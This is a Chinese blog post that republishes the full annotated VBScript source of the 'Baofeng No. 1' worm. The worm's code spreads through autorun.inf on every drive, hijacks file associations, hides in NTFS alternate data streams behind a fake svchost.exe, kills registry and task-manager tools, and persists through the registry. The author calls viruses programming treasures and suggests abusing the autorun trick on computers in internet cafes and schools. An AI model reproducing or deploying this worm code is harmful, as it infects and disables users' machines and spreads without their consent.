---
title: "从暴风一号病毒源码里面找到的宝贝"
source: https://mrxn.net/jswz/57.html
---

# 从暴风一号病毒源码里面找到的宝贝

[Mrxn](https://mrxn.net/author/1)* 发表于2014/12/4 15:19
* 10235浏览
* [0评论](#comment)
* 6小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

今天和朋友聊天中，聊到HTA，说让我学习一下，我就去百度搜素了一下，就在搜索结果中发现了暴风一号病毒，由于对病毒感兴趣，就点击进去了，看了它的介绍和威力，就估摸着下载一份源码来看看，于是Download......以下是我在源码中发现的好东西：

1.病毒会删除HKCR\lnkfile\IsShortcut键值，使快捷方式的图标上叠加的小箭头
![从暴风一号病毒源码里面找到的宝贝](https://mrxn.net/content/uploadfile/201504/7c6aa1e2c231de32ea08d99bd4ae7e4420150418131013.png)
消失。

[博主](https://mrxn.net/)
亲测效果图：

[![2014-000055.jpg](https://mrxn.net/content/uploadfile/201504/1460573d39b2bf549a800882b0c2aecc20150418131017.jpg "点击查看原图")](https://mrxn.net/content/uploadfile/201412/24341417681772.jpg)
[![2014-000057.jpg](https://mrxn.net/content/uploadfile/201504/8420a539c6488b967b4bbc5fb1452d5f20150418131018.jpg "点击查看原图")](https://mrxn.net/content/uploadfile/201412/756c1417682388.jpg)

看起来爽很多是不是！你也可以，删除上图中→\_→右边黄色的
IsShortcut
项 。重启电脑即可看到效果。^\_^

[![2014-000056.jpg](https://mrxn.net/content/uploadfile/201504/4551748682e0016cc2a4553f07ec6a0120150418131020.jpg "点击查看原图")](https://mrxn.net/content/uploadfile/201412/47c61417682242.jpg)
-------这是源码部分截图

2.修改inf,bat,cmd,reg,chm,hlp,txt文件关联：

```
 If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")<>File_Value Then
        Call SetCmdFileAss(VirusAssPath)
    End If
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")<>File_Value Then
        Call SetRegFileAss(VirusAssPath)
    End If
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")<>File_Value Then
        Call SetchmFileAss(VirusAssPath)
    End If
    If ReadReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")<>File_Value Then
        Call SethlpFileAss(VirusAssPath)
    End If ![2014-000058.jpg](https://mrxn.net/content/uploadfile/201504/6ee03edb8ea4afbcdca6d777b81004dc20150418131022.jpg "点击查看原图") 
```

至于这个嘛，我们可以用来修复文件关联错误。比如有时候我们打开EXE或者是上面的
inf,bat,cmd,reg,chm,hlp,txt


，

当然你也可以用来关联你想关联的。嘿嘿   自由发挥！

3.开启所有磁盘的自动运行特性：

```
Sub RegSet()
    On Error Resume Next
    Dim RegPath1 , RegPath2, RegPath3, RegPath4
    RegPath1="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"
    RegPath2="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"
    RegPath3="HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"
    RegPath4="HKEY_CLASSES_ROOT/lnkfile/IsShortcut"
    Call WriteReg (RegPath1, 3, "REG_DWORD")
    Call WriteReg (RegPath2, 2, "REG_DWORD")
    Call WriteReg (RegPath3, 0, "REG_DWORD")
    Call DeleteReg (RegPath4)
End Sub ![2014-000059.jpg](https://mrxn.net/content/uploadfile/201504/e97ac32334a0928d97f8db40b69598cd20150418131024.jpg "点击查看原图")
```

这个我们可以利用啊！特别是对于网吧，学校这种公共场所的电脑，让它自动运行你的软甲你。O(∩\_∩)O哈哈~

算了不说了，估计很多看客就知道第一种 修改桌面图图标上的小鼠标吧！

下面贴出真个病毒的源代码加注释：需要的自行研究，
**病毒都是宝贝啊，都是编程中的精品！**

|  |
| --- |
| On Error Resume Next '//屏蔽出错信息，发生错误时继续向下执行   Dim Fso,WshShell '//定义了两个变量     '//创建并返回对 Automation 对象的引用。   '//CreateObject(servername.typename [, location])   '//servername 必选项。提供对象的应用程序名称。   '//typename 必选项。要创建的对象类型或类。   '//location 可选项。对象所在的网络服务器将被创建。   '//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。     Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT") '//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问   Set WshShell=CreateObject("wScRipT.SHelL") '//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，   '//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。   Call Main() '//call 将控制权传递到sub或function   Sub Main() '//sub、function 两种表示方法 sub没有返回值，function有返回值   On Error Resume Next   Dim Args, VirusLoad, VirusAss   Set Args=WScript.Arguments '//返回wsh对象的参数集   VirusLoad=GetMainVirus(1)  '//获得System文件夹下smss.exe 蠕虫地址   VirusAss=GetMainVirus(0)   '//获得Windows文件夹下explorer.exe 蠕虫地址   ArgNum=0     Do While ArgNum < Args.Count   Param=Param&" "&Args(ArgNum)   ArgNum=ArgNum + 1   Loop   SubParam=LCase(Right(Param, 3)) '//LCase 返回字符串的小写形式 Right 从字符串右边返回指定数目的字符     Select Case SubParam '//select类似switch   Case "run" '//当运行run时，同时启动病毒文件   RunPath=Left(WScript.ScriptFullName, 2) '//ScriptFullName属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "txt", "log","ini" ,"inf" '//运行"txt", "log", "ini", "inf"后缀名文件时，同时启动病毒文件   RunPath="%SystemRoot%/system32/NOTEPAD.EXE "&Param   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "bat", "cmd" '//运行"bat", "cmd"批处理或命令提示符时，同时启动病毒文件   RunPath="CMD /c echo Hi!I'm here!&pause"   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "reg" '//运行"reg"注册表导入程序时，同时启动病毒文件   RunPath="regedit.exe "&""""&Trim(Param)&""""   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "chm" '//运行"chm"帮助文件时，同时启动病毒文件   RunPath="hh.exe "&""""&Trim(Param)&""""   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "hlp" '//运行"hlp"帮助文件时，同时启动病毒文件   RunPath="winhlp32.exe "&""""&Trim(Param)&""""   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "dir" '//运行dir命令，同时启动病毒文件   RunPath=""""&Left(Trim(Param),Len(Trim(Param))-3)&""""   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "oie" '//打开我IE图标，同时启动病毒文件   RunPath="""%ProgramFiles%/Internet Explorer/IEXPLORE.EXE"""   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "omc" '//打开我的电脑图标，同时启动病毒文件   RunPath="explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case "emc" '//劫持Win+E   RunPath="explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"   Call Run(RunPath)   Call InvadeSystem(VirusLoad,VirusAss)   Call Run("%SystemRoot%/system/svchost.exe "&VirusLoad)     Case Else   If PreDblInstance=True Then '//如果条件满足，退出脚本宿主   WScript.Quit   End If   Timeout = Datediff("ww", GetInfectedDate, Date) - 12   If Timeout>0 And Month(Date) = Day(Date) Then   Call VirusAlert()   Call MakeJoke(CInt(Month(Date)))   End If   Call MonitorSystem()     End Select   End Sub     '//监视系统 结束taskmgr.exe、regedit.exe、msconfig.exe、cmd.exe   Sub MonitorSystem()   On Error Resume Next   Dim ProcessNames, ExeFullNames   ProcessNames=Array("cmd.exe","cmd.com","regedit.exe","regedit.scr","regedit.pif","regedit.com","msconfig.exe")   VBSFullNames=Array(GetMainVirus(1)) '//变量赋值   Do   Call KillProcess(ProcessNames) '//如发现变量中的进程，调用结束进程函数   Call InvadeSystem(GetMainVirus(1),GetMainVirus(0)) '// smss.exe 蠕虫地址 explorer.exe 蠕虫地址   Call KeepProcess(VBSFullNames) '//保持病毒进程   WScript.Sleep 3000 '//脚本宿主等待时间为3000毫秒=3秒   Loop   End Sub     '//侵入系统   Sub InvadeSystem(VirusLoadPath,VirusAssPath)   On Error Resume Next   Dim Load\_Value, File\_Value, IE\_Value, MyCpt\_Value1, MyCpt\_Value2, HCULoad, HCUVer, VirusCode, Version   Load\_Value=""""&VirusLoadPath&"""" '//smss.exe的病毒流   File\_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" %1 %\* " '// explorer.exe 蠕虫   IE\_Value="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OIE " '// 打开ie 蠕虫   MyCpt\_Value1="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" OMC " '//打开我的电脑 蠕虫   MyCpt\_Value2="%SystemRoot%/System32/WScript.exe "&""""&VirusAssPath&""""&" EMC " '//劫持Win+E 蠕虫   HCULoad="HKEY\_CURRENT\_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Load"   HCUVer="HKEY\_CURRENT\_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"   HCUDate="HKEY\_CURRENT\_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"   VirusCode=GetCode(WScript.ScriptFullName)   Version=1   HostSourcePath=Fso.GetSpecialFolder(1)&"/Wscript.exe"   HostFilePath=Fso.GetSpecialFolder(0)&"/system/svchost.exe"     For Each Drive In Fso.Drives '//分别建立各个目录的病毒名字   If Drive.IsReady and (Drive.DriveType=1 Or Drive.DriveType=2 Or Drive.DriveType=3) Then   DiskVirusName=GetSerialNumber(Drive.DriveLetter)&".vbs"   Call CreateAutoRun(Drive.DriveLetter,DiskVirusName) '//创建自动运行   Call InfectRoot(Drive.DriveLetter,DiskVirusName) '//感染   End If   Next     If FSO.FileExists(VirusAssPath)=False Or FSO.FileExists(VirusLoadPath)=False Or FSO.FileExists(HostFilePath)=False Or GetVersion()< Version Then   If GetFileSystemType(GetSystemDrive())="NTFS" Then '//判断是否为NTFS分区   Call CreateFile(VirusCode,VirusAssPath)   Call CreateFile(VirusCode,VirusLoadPath) '//这一步创建了流文件   Call CopyFile(HostSourcePath,HostFilePath) '//这一步将wscript.exe从system32复制到system目录并改名svchost.exe   Call SetHiddenAttr(HostFilePath)   Else '//FAT32格式   Call CreateFile(VirusCode, VirusAssPath)   Call SetHiddenAttr(VirusAssPath)   Call CreateFile(VirusCode,VirusLoadPath)   Call SetHiddenAttr(VirusLoadPath)   Call CopyFile(HostSourcePath, HostFilePath)   Call SetHiddenAttr(HostFilePath)   End If   End If     If ReadReg(HCULoad)<>Load\_Value  Then  '//改写注册表启动项，smss.exe的流   Call WriteReg (HCULoad, Load\_Value, "")   End If     If GetVersion() < Version Then   '//改写版本信息为1   Call WriteReg (HCUVer, Version, "")   End If     If GetInfectedDate() = "" Then   Call WriteReg (HCUDate, Date, "")  '//记录感染时间   End If     '//以下更改许多文件关联,病毒的通用感染方式   If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/")<>File\_Value Then   Call SetTxtFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/")<>File\_Value Then   Call SetIniFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/")<>File\_Value Then   Call SetInfFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/")<>File\_Value Then   Call SetBatFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/")<>File\_Value Then   Call SetCmdFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/")<>File\_Value Then   Call SetRegFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/")<>File\_Value Then   Call SetchmFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/")<>File\_Value Then   Call SethlpFileAss(VirusAssPath)   End If     If ReadReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/")<>IE\_Value Then   Call SetIEAss(VirusAssPath)   End If     If ReadReg("HKEY\_CLASSES\_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/")<>IE\_Value Then   Call SetIEAss(VirusAssPath)   End If     If ReadReg("HKEY\_CLASSES\_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/")<>MyCpt\_Value1 Then   Call SetMyComputerAss(VirusAssPath)   End If     If ReadReg("HKEY\_CLASSES\_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/")<>MyCpt\_Value2 Then   Call SetMyComputerAss(VirusAssPath)   End If     Call RegSet()   End Sub     '//拷贝文件   Sub CopyFile(source, pathf)   On Error Resume Next   If FSO.FileExists(pathf) Then   FSO.DeleteFile pathf , True   End If   FSO.CopyFile source, pathf   End Sub     '//创建文件   Sub CreateFile(code, pathf)   On Error Resume Next   Dim FileText   If FSO.FileExists(pathf) Then   Set FileText=FSO.OpenTextFile(pathf, 2, False)   FileText.Write code   FileText.Close   Else   Set FileText=FSO.OpenTextFile(pathf, 2, True)   FileText.Write code   FileText.Close   End If   End Sub     '//注册表设置   Sub RegSet()   On Error Resume Next   Dim RegPath1 , RegPath2, RegPath3, RegPath4   RegPath1="HKEY\_LOCAL\_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/NOHIDDEN/CheckedValue"   RegPath2="HKEY\_LOCAL\_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Advanced/Folder/Hidden/SHOWALL/CheckedValue"   RegPath3="HKEY\_CURRENT\_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoDriveTypeAutoRun"   RegPath4="HKEY\_CLASSES\_ROOT/lnkfile/IsShortcut"   Call WriteReg (RegPath1, 3, "REG\_DWORD")   Call WriteReg (RegPath2, 2, "REG\_DWORD")   Call WriteReg (RegPath3, 0, "REG\_DWORD")   Call DeleteReg (RegPath4)   End Sub     '//结束进程   Sub KillProcess(ProcessNames)   On Error Resume Next   Set WMIService=GetObject("winmgmts://./root/cimv2")   For Each ProcessName in ProcessNames   Set ProcessList=WMIService.execquery(" Select \* From win32\_process where name ='"&ProcessName&"' ")   For Each Process in ProcessList   IntReturn=Process.terminate   If intReturn<>0 Then   WshShell.Run "CMD /c ntsd -c q -p "&Process.Handle, vbHide, False   End If   Next   Next   End Sub     '//删掉autorun.inf免疫目录   Sub KillImmunity(D)   On Error Resume Next   ImmunityFolder=D&":/Autorun.inf"   If Fso.FolderExists(ImmunityFolder) Then   WshSHell.Run ("CMD /C CACLS "& """"&ImmunityFolder&"""" &" /t /e /c /g everyone:f"),vbHide,True   '//提权   WshSHell.Run ("CMD /C RD /S /Q "& ImmunityFolder), vbHide, True   '//rd命令删除，配合 /s /q 选项，很轻松   End If   End Sub     '//保护病毒进程 保持脚本进程持续运行，少于2个创建新进程   Sub KeepProcess(VBSFullNames)   On Error Resume Next   For Each VBSFullName in VBSFullNames   If VBSProcessCount(VBSFullName) < 2 then   Run("%SystemRoot%/system/svchost.exe "&VBSFullName)   End If   Next   End Sub     '//获得系统分区 c:   '//FileSystemObject.GetSpecialFolder 返回指定特殊文件夹   '//WindowsFolder   0   Windows 文件夹，包含 Windows 操作系统安装的文件。   '//SystemFolder    1   System 文件夹，包含库、字体和设备驱动程序文件。   '//TemporaryFolder 2   Temp 文件夹，用于保存临时文件。可以在 TMP 环境变量中找到该文件夹的路径。   '//Left 返回指定数目的从字符串的左边算起的字符。   Function GetSystemDrive()   GetSystemDrive=Left(Fso.GetSpecialFolder(0),2)   End Function     '//FileSystemObject.GetDrive返回与指定的路径中驱动器相对应的 Drive 对象。Drive 提供对磁盘驱动器或网络共享的属性的访问。   '//Drive.FileSystem返回指定的驱动器使用的文件系统的类型。   Function GetFileSystemType(Drive)   Set d=FSO.GetDrive(Drive)   GetFileSystemType=d.FileSystem   End Function     '//读取注册表建值 返回所在路径   Function ReadReg(strkey)   Dim tmps   Set tmps=CreateObject("WScript.Shell")   ReadReg=tmps.RegRead(strkey)   Set tmps=Nothing   End Function     '//重写注册表键值   Sub WriteReg(strkey, Value, vtype)   Dim tmps   Set tmps=CreateObject("WScript.Shell")   If vtype="" Then   tmps.RegWrite strkey, Value   Else   tmps.RegWrite strkey, Value, vtype   End If   Set tmps=Nothing   End Sub     '//删除注册表键值   Sub DeleteReg(strkey)   Dim tmps   Set tmps=CreateObject("WScript.Shell")   tmps.RegDelete strkey   Set tmps=Nothing   End Sub     '//设置隐藏属性   Sub SetHiddenAttr(path)   On Error Resume Next   Dim vf   Set vf=FSO.GetFile(path)   Set vf=FSO.GetFolder(path)   vf.Attributes=6 '// 6=2+4 分别是隐藏、系统属性   End Sub     '//执行ExeFullName指定的文件   Sub Run(ExeFullName)   On Error Resume Next   Dim WshShell   Set WshShell=WScript.CreateObject("WScript.Shell")   WshShell.Run ExeFullName   Set WshShell=Nothing   End Sub     '//感染根目录   Sub InfectRoot(D,VirusName)   On Error Resume Next   Dim VBSCode   VBSCode=GetCode(WScript.ScriptFullName)   VBSPath=D&":/"&VirusName   If FSO.FileExists(VBSPath)=False Then   Call CreateFile(VBSCode, VBSPath)   Call SetHiddenAttr(VBSPath)   End If   Set Folder=Fso.GetFolder(D&":/")  '//隐藏根目录下的所有子目录   Set SubFolders=Folder.Subfolders   For Each SubFolder In SubFolders   SetHiddenAttr(SubFolder.Path)   LnkPath=D&":/"&SubFolder.Name&".lnk"  '//创建对应的快捷方式   TargetPath=D&":/"&VirusName   Args=""""&D&":/"&SubFolder.Name& "/Dir"""   If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) <> TargetPath Then   If Fso.FileExists(LnkPath)=True Then   FSO.DeleteFile LnkPath, True   End If   Call CreateShortcut(LnkPath,TargetPath,Args)   End If   Next   End Sub     '//上一步失败了调用这个函数创建快捷方式   Sub CreateShortcut(LnkPath,TargetPath,Args)   Set Shortcut=WshShell.CreateShortcut(LnkPath)   with Shortcut   .TargetPath=TargetPath   .Arguments=Args   .WindowStyle=4   .IconLocation="%SystemRoot%/System32/Shell32.dll, 3"   .Save   end with   End Sub     '//创建autorun.inf文件   Sub CreateAutoRun(D,VirusName)   On Error Resume Next   Dim InfPath, VBSPath, VBSCode   InfPath=D&":/AutoRun.inf"   VBSPath=D&":/"&VirusName   VBSCode=GetCode(WScript.ScriptFullName)   If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then   Call CreateFile(VBSCode, VBSPath)   Call SetHiddenAttr(VBSPath)   StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell/open=打开(&O)"&VBCRLF&"shell/open/command=WScript.exe "&VirusName&"     ""AutoRun"""&VBCRLF&"shell/open/Default=1"& VBCRLF&"shell/explore=资源管理器(&X)"&VBCRLF&"shell/explore/command=WScript.exe "&VirusName&" ""AutoRun"""   Call KillImmunity(D)   Call CreateFile(StrInf, InfPath)   Call SetHiddenAttr(InfPath)   End If   End Sub     '//改变txt格式文件关联   Sub SetTxtFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变ini格式文件关联   Sub SetIniFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变inf格式文件关联   Sub SetInfFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变bat格式文件关联   Sub SetBatFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变cmd格式文件关联   Sub SetCmdFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变hlp格式文件关联   Sub SethlpFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变reg格式文件关联   Sub SetRegFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变chm格式文件关联   Sub SetchmFileAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %\* "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//篡改IE启动设置   Sub SetIEAss(sFilePath)   On Error Resume Next   Dim Value   Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OIE "   Call WriteReg("HKEY\_LOCAL\_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/", Value, "REG\_EXPAND\_SZ")   Call WriteReg("HKEY\_CLASSES\_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/", Value, "REG\_EXPAND\_SZ")   End Sub     '//改变我的电脑的打开关联，包括Win+E   Sub SetMyComputerAss(sFilePath)   On Error Resume Next   Dim Value1,Value2   Value1="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OMC "   Value2="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" EMC "   Call WriteReg("HKEY\_CLASSES\_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/", "", "REG\_SZ")   Call WriteReg("HKEY\_CLASSES\_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/", Value1, "REG\_EXPAND\_SZ")   Call WriteReg("HKEY\_CLASSES\_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/", Value2, "REG\_EXPAND\_SZ")   End Sub     '//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c-->驱动器 C: - 固定<BR>序列号：-1598325125、d-->驱动器 D: - 固定<BR>序列号：237835280、e、f。   Function GetSerialNumber(Drv)   On Error Resume Next   Set d=fso.GetDrive(Drv)   GetSerialNumber=d.SerialNumber '// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"   '// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select   GetSerialNumber=Replace(GetSerialNumber,"-","")   End Function     '//获得蠕虫病毒路径   &表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹   Function GetMainVirus(N)   On Error Resume Next   MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs"   If GetFileSystemType(GetSystemDrive())="NTFS" Then   If N=1 Then '//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder   GetMainVirus=Fso.GetSpecialFolder(N)&"/smss.exe:"&MainVirusName '//返回 如c:/windows/system32/smss.exe:72161642.vbs   End If   If N=0 Then '//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder   GetMainVirus=Fso.GetSpecialFolder(N)&"/explorer.exe:"&MainVirusName '//返回 如c:/windows/explorer.exe:72161642.vbs   End If   Else   GetMainVirus=Fso.GetSpecialFolder(N)&"/"&MainVirusName   End If   End Function     '//返回指定路径vbs脚本的运行个数   Function VBSProcessCount(VBSPath)   On Error Resume Next   Dim WMIService, ProcessList, Process   VBSProcessCount=0   Set WMIService=GetObject("winmgmts://./root/cimv2")   Set ProcessList=WMIService.ExecQuery("Select \* from Win32\_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")   For Each Process in ProcessList   If InStr(Process.CommandLine, VBSPath)>0 Then   VBSProcessCount=VBSProcessCount+1   End If   Next   End Function     '//'用来计数wscript进程的个数，如果大于等于3个那么返回True   Function PreDblInstance()   On Error Resume Next   PreDblInstance=False   If VBSProcessCount(WScript.ScriptFullName)>= 3 Then   PreDblInstance=True   End If   End Function     '//获取快捷方式的vbs脚本地址   Function GetTargetPath(LnkPath)   On Error Resume Next   Dim Shortcut   Set Shortcut=WshShell.CreateShortcut(LnkPath)   GetTargetPath=Shortcut.TargetPath   End Function     '//读取文件 返回 TextStream   Function GetCode(FullPath)   On Error Resume Next   Dim FileText   Set FileText=FSO.OpenTextFile(FullPath, 1) '//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。    '// 1 以只读模式打开文件。不能对此文件进行写操作。   GetCode=FileText.ReadAll '//读入全部 TextStream 文件并返回结果字符串   FileText.Close   End Function     '//获得注册表 版本键值 获取windows版本   Function GetVersion()   Dim VerInfo   VerInfo="HKEY\_CURRENT\_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"   If ReadReg(VerInfo)="" Then   GetVersion=0   Else   GetVersion=CInt(ReadReg(VerInfo)) '//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。   End If   End Function     '//网页文件BFAlert.hta   Sub VirusAlert()   On Error Resume Next   Dim HtaPath,HtaCode   HtaPath=Fso.GetSpecialFolder(1)&"/BFAlert.hta"   HtaCode="<HTML><HEAD><TITLE>暴风一号</TITLE>"&VBCRLF&"<HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize""     border=""none"""&VBCRLF&"SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no"">"&VBCRLF&"</HEAD><BODY bgcolor=#000000><DIV align     =""center"">"&VBCRLF&"<font style=""font-size:3500%;font-family:Wingdings;color=red"">N</font><BR>"&VBCRLF&"<font style=""font-size:200%;font-family:黑体;color=red"">暴风一号     </font>"&VBCRLF&"</DIV></BODY></HTML>"   If FSO.FileExists(HtaPath)=False Then   Call CreateFile(HtaCode, HtaPath) '//创建网页文件BFAlert.hta   Call SetHiddenAttr(HtaPath) '//设置隐藏   End If   Call Run(HtaPath)   End Sub     '//获得感染注册表时间键   Function GetInfectedDate()   On Error Resume Next   Dim DateInfo   DateInfo="HKEY\_CURRENT\_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"   If ReadReg(DateInfo)="" Then   GetInfectedDate=""   Else   GetInfectedDate=CDate(ReadReg(DateInfo))   End If   End Function     '//弹出光驱   Sub MakeJoke(Times)   On Error Resume Next   Dim WMP, colCDROMs   Set WMP = CreateObject( "WMPlayer.OCX" ) '//创建WMPlayer.OCX插件对象   Set colCDROMs = WMP.cdromCollection '//系统中光驱   If colCDROMs.Count >0 Then   For i=1 to Times   colCDROMs.Item(0).eject() '//退出抽取式设备   WScript.Sleep 3000   colCDROMs.Item(0).eject()   Next   End If   Set WMP = Nothing   End Sub |

* 标签：
* [#
  脚本](https://mrxn.net/tag/%E8%84%9A%E6%9C%AC)
* [#
  病毒](https://mrxn.net/tag/%E7%97%85%E6%AF%92)
* [#
